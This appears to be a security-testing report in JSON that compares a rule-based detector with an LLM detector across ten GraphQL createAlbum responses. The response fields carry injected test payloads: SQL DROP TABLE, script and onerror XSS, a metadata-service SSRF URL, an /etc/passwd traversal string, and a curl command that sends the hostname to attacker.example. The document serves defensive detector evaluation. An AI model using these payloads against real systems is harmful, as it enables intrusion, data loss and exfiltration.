@@ -1,0 +1,778 @@
+{
+  "report_timestamp": "2025-10-05T21:30:53.419267",
+  "api_url": "https://graphqlzero.almansi.me/api",
+  "summary": {
+    "total_comparisons": 10,
+    "agreement_rate": 0.3,
+    "simple_detections": 6,
+    "llm_detections": 5,
+    "consensus_breakdown": {
+      "simple_only": 2,
+      "both_detected": 4,
+      "no_vulnerabilities": 3,
+      "llm_only": 1
+    },
+    "detection_ratio": 0.8333333333333334,
+    "potential_analysis": {
+      "potential_agreement_rate": 0.0,
+      "simple_potential_detections": 5,
+      "llm_potential_detections": 1,
+      "potential_consensus_breakdown": {
+        "simple_potential_only": 5,
+        "no_potential": 4,
+        "llm_potential_only": 1
+      },
+      "potential_detection_ratio": 0.2
+    }
+  },
+  "detailed_comparisons": [
+    {
+      "timestamp": "2025-10-05T21:28:48.853775",
+      "node_name": "createAlbum_response_2",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "Summer Vacation'); DROP TABLE users; --",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham",
+              "email": "Sincere@april.biz"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "SQL Injection (SQLi) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
+            "evidence": "Response status: 200, SQL patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Injection Attacks"
+        ],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "simple_only",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:29:00.893153",
+      "node_name": "createAlbum_response_3",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "<script>alert('xss')</script>",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Cross-Site Scripting (XSS) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
+            "evidence": "Response status: 200, XSS patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: xss_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The GraphQL response includes raw HTML/script content in the 'title' field: \"<script>alert('xss')</script>\". Returning unescaped script tags in API responses is a strong indicator of reflected/stored XSS risk: if a client (web application) inserts this value into the DOM without proper escaping or sanitization, an attacker-controlled script will execute in users' browsers. While exploitability depends on how the frontend uses this field, the presence of a script tag in API data is a clear unsafe practice. Recommended mitigations: validate and sanitize input on the server, encode/escape output when rendering into HTML (use textContent/innerText rather than innerHTML), implement a robust content security policy (CSP), and enforce input length/type restrictions.",
+            "evidence": "\"title\": \"<script>alert('xss')</script>\" in GraphQL response body",
+            "confidence": 0.9,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "xss_injection",
+              "severity": "HIGH",
+              "confidence": 0.9,
+              "evidence": "\"title\": \"<script>alert('xss')</script>\" in GraphQL response body",
+              "explanation": "The GraphQL response includes raw HTML/script content in the 'title' field: \"<script>alert('xss')</script>\". Returning unescaped script tags in API responses is a strong indicator of reflected/stored XSS risk: if a client (web application) inserts this value into the DOM without proper escaping or sanitization, an attacker-controlled script will execute in users' browsers. While exploitability depends on how the frontend uses this field, the presence of a script tag in API data is a clear unsafe practice. Recommended mitigations: validate and sanitize input on the server, encode/escape output when rendering into HTML (use textContent/innerText rather than innerHTML), implement a robust content security policy (CSP), and enforce input length/type restrictions."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:29:12.059608",
+      "node_name": "createAlbum_response_4",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "Imported cover from http://169.254.169.254/latest/meta-data",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham",
+              "website": "hildegard.org"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "SSRF injection vulnerability detected - internal network access patterns found",
+            "evidence": "Response status: 200, SSRF keywords detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: ssrf_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The GraphQL response shows the server fetched or referenced the internal IP 169.254.169.254 (the cloud instance metadata service) and incorporated that URL/result into the created resource's title. This is strong evidence the server will follow/supply attacker-controlled URLs and can reach internal-only addresses, which is a classic SSRF pattern. Access to 169.254.169.254 can allow an attacker to retrieve cloud instance metadata and credentials, leading to full account compromise. Recommended mitigations: validate and restrict URLs before fetching (apply allowlist), block requests to private and link-local IP ranges (including 169.254.0.0/16), perform DNS resolution checks, run fetches from isolated network segments, and require and enforce metadata-service protections (IMDSv2) on cloud instances.",
+            "evidence": "Response contains: \"title\": \"Imported cover from http://169.254.169.254/latest/meta-data\"",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "ssrf_injection",
+              "severity": "CRITICAL",
+              "confidence": 0.95,
+              "evidence": "Response contains: \"title\": \"Imported cover from http://169.254.169.254/latest/meta-data\"",
+              "explanation": "The GraphQL response shows the server fetched or referenced the internal IP 169.254.169.254 (the cloud instance metadata service) and incorporated that URL/result into the created resource's title. This is strong evidence the server will follow/supply attacker-controlled URLs and can reach internal-only addresses, which is a classic SSRF pattern. Access to 169.254.169.254 can allow an attacker to retrieve cloud instance metadata and credentials, leading to full account compromise. Recommended mitigations: validate and restrict URLs before fetching (apply allowlist), block requests to private and link-local IP ranges (including 169.254.0.0/16), perform DNS resolution checks, run fetches from isolated network segments, and require and enforce metadata-service protections (IMDSv2) on cloud instances."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:29:30.986332",
+      "node_name": "createAlbum_response_5",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "Backup; curl http://attacker.example/collect?host=$(hostname)",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:29:44.699650",
+      "node_name": "createAlbum_response_6",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "../..//etc/passwd (attempt path traversal)",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Path Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "Path injection vulnerability detected - file system access patterns found",
+            "evidence": "Response status: 200, Path injection patterns detected in response"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Injection Attacks"
+        ],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "simple_only",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:29:55.689511",
+      "node_name": "createAlbum_response_7",
+      "response_status": 200,
+      "response_body": {
+        "data": {
+          "createAlbum": {
+            "id": "101",
+            "title": "<div class=\"album\">Uploaded<img src=x onerror=\"alert('html')\"></div>",
+            "user": {
+              "id": "1",
+              "name": "Leanne Graham"
+            }
+          }
+        }
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "HTML Injection",
+            "detection": "potential",
+            "category": "Injection Attacks",
+            "description": "HTML injection vulnerability detected - HTML markup found in response",
+            "evidence": "Response status: 200, HTML patterns detected in response data"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": [
+          "Injection Attacks"
+        ]
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: html_injection",
+            "detection": "vulnerable",
+            "category": "Injection Attacks",
+            "description": "The GraphQL response returns the title field containing raw HTML with an <img> tag and an onerror event handler (alert('html')). This is clear HTML injection: if the client (web application) inserts this value into the DOM without proper escaping or sanitization, the onerror handler will execute (resulting in XSS). Because the server is returning unescaped markup, this is a high-risk issue for stored/reflected cross-site scripting in any front-end that renders these values as HTML. Mitigation: ensure output encoding/escaping on render, or sanitize/strip HTML on the server or at the API boundary; apply a whitelist-based HTML sanitizer if rich text is required.",
+            "evidence": "\"title\": \"<div class=\\\"album\\\">Uploaded<img src=x onerror=\\\"alert('html')\\\"></div>\"",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "html_injection",
+              "severity": "HIGH",
+              "confidence": 0.95,
+              "evidence": "\"title\": \"<div class=\\\"album\\\">Uploaded<img src=x onerror=\\\"alert('html')\\\"></div>\"",
+              "explanation": "The GraphQL response returns the title field containing raw HTML with an <img> tag and an onerror event handler (alert('html')). This is clear HTML injection: if the client (web application) inserts this value into the DOM without proper escaping or sanitization, the onerror handler will execute (resulting in XSS). Because the server is returning unescaped markup, this is a high-risk issue for stored/reflected cross-site scripting in any front-end that renders these values as HTML. Mitigation: ensure output encoding/escaping on render, or sanitize/strip HTML on the server or at the API boundary; apply a whitelist-based HTML sanitizer if rich text is required."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [
+          "Injection Attacks"
+        ],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 1.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Injection Attacks"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [
+            "Injection Attacks"
+          ],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "simple_potential_only"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:30:05.512421",
+      "node_name": "createAlbum_response_8",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:30:16.550424",
+      "node_name": "createAlbum_response_9",
+      "response_status": null,
+      "response_body": null,
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [],
+        "agreement_score": 0.0,
+        "consensus": "no_vulnerabilities",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:30:37.184450",
+      "node_name": "createAlbum_response_10",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"createAlbum\" on type \"Query\".",
+            "locations": [
+              {
+                "line": 3,
+                "column": 3
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [],
+        "count": 0,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: introspection",
+            "detection": "safe",
+            "category": "Injection Attacks",
+            "description": "The GraphQL error response discloses schema-level information: it reveals the operation attempted (createAlbum), the type name (Query) and a validation failure. While this response does not show full __schema/__type introspection output, the detailed validation error allows an attacker to enumerate available types/fields by probing and analyzing errors. This constitutes information disclosure/introspection risk. Impact is limited (low) since no sensitive data is returned, but repeated probing could map the schema. Recommend suppressing or genericizing error messages in production (avoid returning raw GraphQL validation errors), and consider disabling GraphQL introspection or restricting it to authenticated/authorized clients.",
+            "evidence": "Error response: \"Cannot query field \\\"createAlbum\\\" on type \\\"Query\\\".\" (extensions.code: GRAPHQL_VALIDATION_FAILED)",
+            "confidence": 0.6,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "introspection",
+              "severity": "LOW",
+              "confidence": 0.6,
+              "evidence": "Error response: \"Cannot query field \\\"createAlbum\\\" on type \\\"Query\\\".\" (extensions.code: GRAPHQL_VALIDATION_FAILED)",
+              "explanation": "The GraphQL error response discloses schema-level information: it reveals the operation attempted (createAlbum), the type name (Query) and a validation failure. While this response does not show full __schema/__type introspection output, the detailed validation error allows an attacker to enumerate available types/fields by probing and analyzing errors. This constitutes information disclosure/introspection risk. Impact is limited (low) since no sensitive data is returned, but repeated probing could map the schema. Recommend suppressing or genericizing error messages in production (avoid returning raw GraphQL validation errors), and consider disabling GraphQL introspection or restricting it to authenticated/authorized clients."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 0,
+        "safe_count": 1,
+        "categories": [
+          "Injection Attacks"
+        ],
+        "potential_categories": []
+      },
+      "comparison": {
+        "total_categories": [
+          "Injection Attacks"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [],
+        "llm_unique_categories": [
+          "Injection Attacks"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "llm_only",
+        "potential_analysis": {
+          "total_potential_categories": [],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "no_potential"
+        }
+      }
+    },
+    {
+      "timestamp": "2025-10-05T21:30:53.417594",
+      "node_name": "createAlbum_response_11",
+      "response_status": 400,
+      "response_body": {
+        "errors": [
+          {
+            "message": "Cannot query field \"websit\" on type \"User\". Did you mean \"website\"?",
+            "locations": [
+              {
+                "line": 8,
+                "column": 7
+              }
+            ],
+            "extensions": {
+              "code": "GRAPHQL_VALIDATION_FAILED"
+            }
+          }
+        ]
+      },
+      "simple_detector": {
+        "results": [
+          {
+            "detection_name": "Field Suggestions Enabled",
+            "detection": "vulnerable",
+            "category": "Information Disclosure",
+            "description": "Field suggestions enabled - potential information disclosure",
+            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 1,
+        "potential_count": 0,
+        "safe_count": 0,
+        "categories": [
+          "Information Disclosure"
+        ],
+        "potential_categories": []
+      },
+      "llm_detector": {
+        "results": [
+          {
+            "detection_name": "LLM: field_suggestions",
+            "detection": "potential",
+            "category": "Unknown",
+            "description": "The GraphQL server returned an error that includes a suggested field name ('Did you mean \"website\"?') after a malformed query for 'websit'. This behavior discloses schema information (available field names) to an unauthenticated requester, effectively providing field suggestions that aid in schema enumeration. Such information can be used by attackers to discover valid fields and craft targeted queries for sensitive data. The risk is contextual (depends on what fields exist and access controls), so severity is set to MEDIUM. Recommend suppressing detailed suggestion messages in errors or returning generic validation errors, and ensure introspection and verbose error output are appropriately restricted in production.",
+            "evidence": "Response error message: \"Cannot query field \\\"websit\\\" on type \\\"User\\\". Did you mean \\\"website\\\"?\" (Status Code: 400)",
+            "confidence": 0.95,
+            "llm_analysis": {
+              "is_vulnerable": true,
+              "vulnerability_type": "field_suggestions",
+              "severity": "MEDIUM",
+              "confidence": 0.95,
+              "evidence": "Response error message: \"Cannot query field \\\"websit\\\" on type \\\"User\\\". Did you mean \\\"website\\\"?\" (Status Code: 400)",
+              "explanation": "The GraphQL server returned an error that includes a suggested field name ('Did you mean \"website\"?') after a malformed query for 'websit'. This behavior discloses schema information (available field names) to an unauthenticated requester, effectively providing field suggestions that aid in schema enumeration. Such information can be used by attackers to discover valid fields and craft targeted queries for sensitive data. The risk is contextual (depends on what fields exist and access controls), so severity is set to MEDIUM. Recommend suppressing detailed suggestion messages in errors or returning generic validation errors, and ensure introspection and verbose error output are appropriately restricted in production."
+            }
+          }
+        ],
+        "count": 1,
+        "vulnerable_count": 0,
+        "potential_count": 1,
+        "safe_count": 0,
+        "categories": [
+          "Unknown"
+        ],
+        "potential_categories": [
+          "Unknown"
+        ]
+      },
+      "comparison": {
+        "total_categories": [
+          "Information Disclosure",
+          "Unknown"
+        ],
+        "common_categories": [],
+        "simple_unique_categories": [
+          "Information Disclosure"
+        ],
+        "llm_unique_categories": [
+          "Unknown"
+        ],
+        "agreement_score": 0.0,
+        "consensus": "both_detected",
+        "potential_analysis": {
+          "total_potential_categories": [
+            "Unknown"
+          ],
+          "common_potential_categories": [],
+          "simple_unique_potential_categories": [],
+          "llm_unique_potential_categories": [
+            "Unknown"
+          ],
+          "potential_agreement_score": 0.0,
+          "potential_consensus": "llm_potential_only"
+        }
+      }
+    }
+  ],
+  "detector_analysis": {
+    "simple_detector": {
+      "description": "Rule-based detector using predefined patterns",
+      "strengths": [
+        "Fast execution",
+        "Consistent results",
+        "Low resource usage"
+      ],
+      "weaknesses": [
+        "Limited to known patterns",
+        "May miss novel attacks",
+        "False negatives possible"
+      ]
+    },
+    "llm_detector": {
+      "description": "AI-powered detector using language model analysis",
+      "strengths": [
+        "Contextual understanding",
+        "Novel attack detection",
+        "Detailed analysis"
+      ],
+      "weaknesses": [
+        "Slower execution",
+        "Resource intensive",
+        "Potential false positives"
+      ]
+    }
+  }
+}
